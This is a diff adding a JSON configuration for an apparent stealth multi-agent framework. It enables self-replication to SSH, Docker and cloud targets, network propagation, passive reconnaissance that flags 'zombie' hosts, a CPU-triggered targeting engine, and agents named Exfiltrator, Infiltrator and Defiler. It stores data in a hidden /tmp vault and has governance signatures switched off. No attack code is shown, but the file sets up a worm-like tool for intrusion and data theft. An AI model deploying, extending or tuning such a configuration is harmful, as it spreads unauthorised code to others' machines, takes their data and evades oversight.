@@ -1,0 +1,201 @@
+{
+  "node_id": "controller-node",
+  "listen_port": 8765,
+  "http_port": 8000,
+  "stealth": true,
+
+  "bootstrap_peers": [
+    "127.0.0.1:8765",
+    "192.168.0.42:8765",
+    "198.51.100.123:8765"
+  ],
+
+  "redis_url": "redis://localhost:6379",
+  "vault_path": "/tmp/.blackvault",
+
+  "enable_replicator": true,
+  "replication_budget": 150,
+  "replication_cost": 50,
+  "replication_targets": [
+    "ssh://user@192.168.0.50",
+    "docker://remote-daemon",
+    "cloud://aws-ec2"
+
+  ],
+
+  "enable_propagation": true,
+  "propagation_budget": 70,
+  "propagation_seed_interval": 30,
+
+  "enable_economic_layer": true,
+  "enable_mesh": true,
+  "log_level": "INFO",
+  "governance_signatures": false,
+
+  "shogun": {
+    "enabled": true,
+    "passive_duration": 900,
+    "cycle_interval": 3600,
+    "zombie_min_observations": 5,
+    "zombie_max_pps": 0.3,
+    "require_root": true,
+    "description": "Ultra-passive network topology mapper with zombie candidate detection"
+  },
+  "targeting_engine": {
+    "enabled": true,
+    "cpu_threshold": 75.0,
+    "propagation_window": 300,
+    "trust_threshold": 0.6,
+    "handshake_timeout": 10,
+    "max_handshake_attempts": 3,
+    "cost_per_targeting_op": 0.15,
+    "reward_per_trust": 0.3,
+    "description": "CPU-triggered targeting engine with trust-based handshakes"
+  },
+  "agents": [
+    {
+      "name": "AccountantAgent",
+      "module": "agents.accountant",
+      "methods": [
+        "register_agent",
+        "process_agent_spend",
+        "allocate_budget",
+        "merge_wallets",
+        "get_wallet",
+        "get_all_wallets",
+        "get_agent_hashes",
+        "get_agent_name_from_hash"
+      ]
+    },
+    {
+      "name": "ArchivistAgent",
+      "module": "agents.archivist",
+      "methods": [
+        "archive_data",
+        "retrieve_data",
+        "delete_data",
+        "list_archives"
+      ]
+    },
+    {
+      "name": "BaseAgent",
+      "module": "agents.base",
+      "methods": [
+        "__init__",
+        "run",
+        "stop",
+        "status"
+      ]
+    },
+    {
+      "name": "BehaviourAdapterAgent",
+      "module": "agents.behaviour_adapter",
+      "methods": [
+        "adapt_behaviour",
+        "get_behaviour_profile"
+      ]
+    },
+    {
+      "name": "DefilerAgent",
+      "module": "agents.defiler",
+      "methods": [
+        "defile",
+        "sanitize"
+      ]
+    },
+    {
+      "name": "EnforcerAgent",
+      "module": "agents.enforcer",
+      "methods": [
+        "enforce_policy",
+        "audit_agent"
+      ]
+    },
+    {
+      "name": "ExfiltratorAgent",
+      "module": "agents.exfiltrator",
+      "methods": [
+        "exfiltrate",
+        "prepare_payload"
+      ]
+    },
+    {
+      "name": "InfiltratorAgent",
+      "module": "agents.infiltrator",
+      "methods": [
+        "infiltrate",
+        "gather_intel"
+      ]
+    },
+    {
+      "name": "LearningAgent",
+      "module": "agents.learning",
+      "methods": [
+        "learn",
+        "update_knowledge_base"
+      ]
+    },
+    {
+      "name": "MissionAgent",
+      "module": "agents.mission",
+      "methods": [
+        "assign_mission",
+        "get_mission_status"
+      ]
+    },
+    {
+      "name": "PeerLinkerAgent",
+      "module": "agents.peer_linker",
+      "methods": [
+        "link_peer",
+        "unlink_peer",
+        "list_peers"
+      ]
+    },
+    {
+      "name": "PropagationAgent",
+      "module": "agents.propagation_agents",
+      "methods": [
+        "should_activate",
+        "get_status",
+        "__init__",
+        "_deduct_propagation_cost",
+        "_reward_propagation_success",
+        "_burn_on_propagation_failure",
+        "_load_config",
+        "run",
+        "_emit_event",
+        "_reachable",
+        "_propagate",
+        "_prepare_bundle",
+        "_rsync_bundle",
+        "_spawn",
+        "_schedule_cleanup"
+      ]
+    },
+    {
+      "name": "ShogunReconAgent",
+      "module": "agents.shogun_recon",
+      "methods": [
+        "should_activate",
+        "run",
+        "get_topology",
+        "get_zombie_candidates",
+        "get_node_by_ip",
+        "filter_nodes_by_status"
+      ]
+    },
+    {
+      "name": "TargetingEngine",
+      "module": "agents.targeting_engine",
+      "methods": [
+        "should_activate",
+        "run",
+        "attach_kernel",
+        "get_status",
+        "get_target_profiles",
+        "queue_cpu_triggered_mission"
+      ]
+    }
+  ]
+}
